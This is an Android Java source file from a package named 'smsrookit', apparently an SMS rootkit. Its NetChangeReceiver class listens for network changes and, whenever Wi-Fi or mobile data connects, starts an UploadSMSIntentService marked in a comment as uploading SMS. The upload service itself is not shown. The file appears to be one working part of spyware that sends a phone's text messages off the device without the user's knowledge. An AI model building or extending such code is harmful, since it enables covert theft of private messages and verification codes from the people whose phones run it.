package com.funny.fortest.smsrookit;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.NetworkInfo.State;
import android.net.Uri;
import android.util.Log;
import android.widget.Toast;
import android.database.Cursor;
import java.util.ArrayList;

public class NetChangeReceiver extends BroadcastReceiver {
    public NetChangeReceiver() {
    }


    @Override
    public void onReceive(Context context, Intent intent) {
        // TODO: This method is called when the BroadcastReceiver is receiving
        // an Intent broadcast.
        // TODO: 2016/4/1 get network status
        ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        State wifiState = cm.getNetworkInfo(ConnectivityManager.TYPE_WIFI).getState();
        State mobileState = cm.getNetworkInfo(ConnectivityManager.TYPE_MOBILE).getState();

        if (wifiState != null && mobileState != null && (State.CONNECTED == wifiState || State.CONNECTED == mobileState)) {
            Log.d("zhaochengyu", "NetChangeReceiver onReceive: network online !");
            // TODO: 2016/4/1 upload sms by uploadsmsintentservice
            Intent intentService = new Intent(SMSApplication.getContext(), UploadSMSIntentService.class);
            SMSApplication.getContext().startService(intentService);

            } else {
                Log.d("zhaochengyu", "NetChangeReceiver onReceive: network offline !");
            }
        }
    }

